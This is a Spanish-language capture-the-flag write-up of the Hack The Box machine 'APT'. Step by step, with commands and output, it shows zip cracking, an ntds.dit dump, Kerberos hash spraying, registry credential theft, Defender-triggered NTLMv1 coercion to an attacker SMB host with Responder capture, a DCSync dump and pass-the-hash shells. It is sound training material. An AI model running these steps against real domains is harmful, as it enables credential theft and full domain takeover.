---
title: APT - Insane (HTB)
tags:
permalink: /APT-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p80,135 10.129.96.60              
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 22:55 -0500
Nmap scan report for 10.129.96.60
Host is up (0.39s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
```

## Website 

La pagina principal es estatica sin nada de nada.

![[Pasted image 20260101005756.png]]

## RPC

Para enumerar `rpc` use la tool en el siguiente [repositorio](https://github.com/mubix/IOXIDResolver) para averiguar la dirección `ipv6` del dominio ya que podría también vía protocolo `snmp` pero el puerto no esta expuesto localmente, y ademas con `rpcclient` la conexion se intenta a traves del puerto `445` el cual tampoco esta abierto.

```bash
root㉿kali)-[/home/zs1n/Desktop/htb/apt]
└─# git clone https://github.com/mubix/IOXIDResolver   
Cloning into 'IOXIDResolver'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 33 (delta 12), reused 5 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (33/33), 9.04 KiB | 9.04 MiB/s, done.
Resolving deltas: 100% (12/12), done.
```
## Nmap IPv6

```bash
python3 IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::95ef:d379:b3a:863a
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::1a5
```

Como se puede ver esta dirección detecta muchos mas puertos.

```bash
nmap  -sCV -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 dead:beef::b885:d62a:d679:573f -oG nmap_ipv6
Starting Nmap 7.91 ( https://nmap.org ) at 2025-12-31 12:46 EDT
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.025s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-02 16:49:09Z)
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m50s, deviation: 22m38s, median: 2m42s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2021-04-02T17:49:53+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-02T16:49:49
|_  start_date: 2021-04-02T15:21:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.40 seconds
```
### SMB null session

Usando la autenticación nula veo que es valida.

```bash
nxc smb apt.htb -u '' -p ''
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [*] Windows 10 / Server 2016 Build 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [+] htb.local\:
```
### Registry files

Así que realice la conexión con `smbclient`, donde dentro del mismo solo obtuve acceso al recurso `backup`, dentro del mismo hay un `zip` el cual me descargue a mi maquina.

```bash
impacket-smbclient 'htb.local/@apt.htb' -no-pass -dc-ip dead:beef::95ef:d379:b3a:863a 
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
backup
IPC$
NETLOGON
SYSVOL
# use backup
ls
# ls
drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 .
drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 ..
-rw-rw-rw-   10650961  Thu Sep 24 03:31:03 2020 backup.zip
# get backup.zip
```
## Shell as henry_vinson_adm

Veo que al intentar descomprimirlo parece estar protegido por una `password`.

```bash
7z x backup.zip  

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10650961 bytes (11 MiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 10650961

    
Enter password (will not be echoed):
```

### Crack password

Por lo que use `zip2john` para obtener un hash de este archivo para luego crackearlo con `john`.

```bash
zip2john backup.zip > hash_zip
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Lo crackeo

```bash                                                                                                                     
john hash_zip -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2025-12-31 23:03) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### Dump hashes

Unas ves desbloque el mismo use `secretsdump` para dumpear todos los datos de estos registros, el cual me devolvió aprox `2000` hashes.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SYSTEM LOCAL
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::
<SNIP>
```
### Valid users

Cree una lista de usuarios, y hashes con las siguientes expresiones regulares.

```bash
cat hashes_users | grep ':::' | tr ':' ' ' | awk '{print $4}' > hashes
```

```bash
cat hashes_users | grep ':::' | tr ':' ' ' | awk '{print $1}' > userss
```

Luego con la lista de usuario necesitaba saber cuales de todos los usuarios del archivo eran validos, asi que use [kerbrute](https://github.com/ropnop/kerbrute).

```bash
 kerbrute userenum --dc apt.htb -d htb.local userss 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/31/25 - Ronnie Flathers @ropnop

2025/12/31 23:07:24 >  Using KDC(s):
2025/12/31 23:07:24 >   apt.htb:88

2025/12/31 23:07:30 >  [+] VALID USERNAME:       Administrator@htb.local
2025/12/31 23:07:31 >  [+] VALID USERNAME:       APT$@htb.local
2025/12/31 23:12:18 >  [+] VALID USERNAME:       henry.vinson@htb.local
2025/12/31 23:29:46 >  Done! Tested 2000 usernames (3 valid) in 1342.149 seconds
```
### Hash spraying

Ahora que tengo una lista de usuarios y debido a que no tengo | en texto claro, intente hace algo parecido a la función de password spray de la herramienta anterior pero con hashes, como | no esta diseñada para esta tarea, encontré esta [version](https://github.com/3gstudent/pyKerbrute/blob/master/ADPwdSpray.py) en python, que se asemeja a lo que quiero hacer solo que la tuve que modificar ligeramente, ya que la misma sólo usa una lista de usuario pero con un hash único.

El script solamente le borre todo el `main` y lo deje así, y además para que admita conexiones `ipv6` reemplace en la líneas que dice `AF_INET` por `AF_INET6`.

```python
<SNIP>
user_realm = 'htb.local'
    user_name = 'henry.vinson'
    kdc_a = 'apt.htb'

    file= open("hashes", "r")

    info = log.progress("Iniciando Hash Spraying")
    counter = 1

    for hash in file.readlines():
        hash = hash.strip()

        progress = log.progress("Testing with hash %s: %d/2000" % (hash, counter) )

        user_key = (RC4_HMAC, hash.decode('hex'))
        passwordspray_tcp(user_realm, user_name, user_key, kdc_a, hash)
        
        counter += 1
```

Luego de correrlo y esperar unos minutos veo que encuentra una coincidencia.

```bash
python2.7 pwd.py
[/.......] Iniciando Hash Spraying:
[|] Testing with hash 7c662956a4a0486a80fbb2403c5a9c2c: 1567/2000
[+] Valid login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
```

Ahora me dirigí a solicitar un `tgt` y exportarlo a la variable de entorno de `kerberos`.

> Cabe aclarar que `kerberos` necesita una sincronización de hora de nuestra maquina con el `DC` para poder obtener un hash, para realizar dicha tarea yo use `ntpdate -b <ip>`.

```bash
impacket-getTGT htb.local/henry.vinson  -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in henry.vinson.ccache

export KRB5CCNAME=henry.vinson.ccache
```
### Credentials in registry.

Debido a que el usuario `henry.vinson` no es parte del grupo `Remote Management Users` no puedo conectarme a la maquina, por lo que me queda solo enumerar el registro, con `reg` de impacket.

Después de listar registros como `HKLM`(HKEY_LOCAL_MACHINE) o `HKCU`(HKEY_CURRENT_USER), llegue al registro `HKU` donde veo una ruta con el nombre de la pagina `(GiganticHosting)`.

```bash
reg.py htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local query -keyName HKU\\SOFTWARE
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes
```

Listando el contenido de este encontré las credenciales de un usuario que no existía en el archivo `ntds.dit` y los demás.

```
reg.py htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```
### Auth

Por lo que usando las mismas me conecte con `evil-winrm`.

```powershell
evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'
                                        
Evil-WinRM shell v3.9
<SNIP>
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> type ../desktop/user.txt
d7ae89574dc4b6422f9ad5760845fbeb
```
## Shell as administrator

La ruta para la escalada de privilegios es que se encuentra el bloque de scripts que se ejecuta como administrador en el archivo de `historial` powershell que habilita el `nivel 2` de `lmcompatibilitylevel`, lo que significa que `DC` acepta la autenticación `NT, NTLMv1 y NTLMv2` de acuerdo con la documentación de Microsoft:

```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> ls


    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/10/2020  15:47 AM            458 ConsoleHost_history.txt

*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> cat ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

![[Pasted image 20260101013704.png]]
## Collect hash NTLMv1

Como se ahora que la autenticación `NTLMv1` esta activada, se puede abusar de la misma, y es acá cuando entran en juego las conocidas `Rainbow Tables`.

>Las `Rainbow Tables` (tablas arcoíris) son el "atajo" definitivo para romper `NTLMv1`. Tienen una relación directa porque NTLMv1 es un protocolo que, por su diseño antiguo, permite que el trabajo pesado de descifrado se haga **antes** de siquiera tocar tu red.

Para que una `Rainbow Table` funcione, el "desafío" (`challenge`) que el servidor envía al cliente debe ser conocido de antemano, en un ataque normal este challenge es `aleatorio`, Sin embargo, herramientas como `Responder` permiten forzar un desafío estático (típicamente `1122334455667788`).
Como el desafío es siempre el mismo, alguien ya pudo calcular todas las respuestas posibles para todas las contraseñas posibles y guardarlas en una tabla.

Además existe un servicio muy famoso llamado `Crack.sh` (o `NTLMv1.com`). Ellos tienen Rainbow Tables masivas que cubren `todo el espacio de claves de 56 bits de DES` (el algoritmo de NTLMv1). De manera que si logro capturar un hash de esta versión paginas como estas, recuperar la clave, lo que nosotros conocemos con `"Hash NT"`, en minutos, sin importar lo larga que sea la cadena original.

Para proceder con el ataque, configure `Responder`, con el `challenge` de esta forma.

```bash
 cat /etc/responder/Responder.conf
[Responder Core]
<SNIP>

; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
;Challenge = Random
Challenge = 1122334455667788
```

Luego para hacer que el propio sistema se comunique con mi servidor puedo usar el propio binario del Windows Defender para crear una tarea, la cual fuerce una autenticación, y que analice un archivo que una ruta de `smb` compartida. Usando el tipo `3` de escaneo para un escaneo personalizado

```powershell
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.19\test
```

Y luego desde mi `responder` , donde con el parámetro `--lm` le digo que se degrade  a `Hashes LM`, y de manera que responder le dice `"Mandame la respuesta en el formato mas debil posible"`. Es así como intercepte el hash.

```bash
responder -I tun0 --lm
<SNIP>
[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```
### Crack hash

Luego usando la misma herramienta `ntlm1.py` que se encuentra en este [repositorio](https://github.com/evilmog/ntlmv1-multi), logre que del hash entero me devuelva la parte mas importante que es el hash `NT`.

```bash
python3 ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
Hashfield Split:
['APT$', '', 'HTB', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '1122334455667788']

Hostname: HTB
Username: APT$
Challenge: 1122334455667788
LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
CT1: 95ACA8C7248774CB
CT2: 427E1AE5B8D5CE68
CT3: 30A49B5BB858D384

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788

To crack with hashcat create a file with the following contents:
95ACA8C7248774CB:1122334455667788
427E1AE5B8D5CE68:1122334455667788

echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1

Once complete run output through deskey_to_ntlm.pl
```
### NTLMv1.com

Para obtener el hash NTLMv1, debido a que al momento de hacer la maquina la pagina de `crack.sh` esta en mantenimiento, use [ntlmv1.com](https://ntlmv1.com/)

Donde dentro de la misma coloco el hash NT que recolecte e indicándole el tipo de cifrado que tiene.

> Nota: para poder llevar a cabo esta tarea necesitas loguearte en la pagina.

![[Pasted image 20260101015140.png]]

Luego de unos segundos me fui a la sección de `Tasks`.

![[Pasted image 20260101015217.png]]

Y luego en seleccionando en `Purchase`, me devolvió el hash `NTLMv1`.

![[Pasted image 20260101015159.png]]
### Hash spraying

Usando el hash, y con la lista de usuario validos que recolecte con `kerbrute` dio coincidencia con el usuario maquina `apt$`.

```bash
nxc smb apt.htb -u valid_users -H 'd167c3238864b12f5f82feae86a7f798'
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [*] Windows 10 / Server 2016 Build 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [+] htb.local\apt$:d167c3238864b12f5f82feae86a7f798 
```
### Dump hashes

Ahora con `secretsdump`, nuevamente dumpee los hashes del dominio, obteniendo así el hash del usuario `Administrator`.

```bash
 impacket-secretsdump 'apt.htb/apt$@apt.htb' -hashes :d167c3238864b12f5f82feae86a7f798 -dc-ip apt.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up... 
```
### Shell

Y luego me conecte a `WinRM`.

```powershell
evil-winrm -i htb.local -u administrator -H 'c370bddf384a691d811ff3495e8a72e2'
                                        
Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
9c5bce59c479e556e4f293b9acd6bcbe
```

`~Happy Hacking.`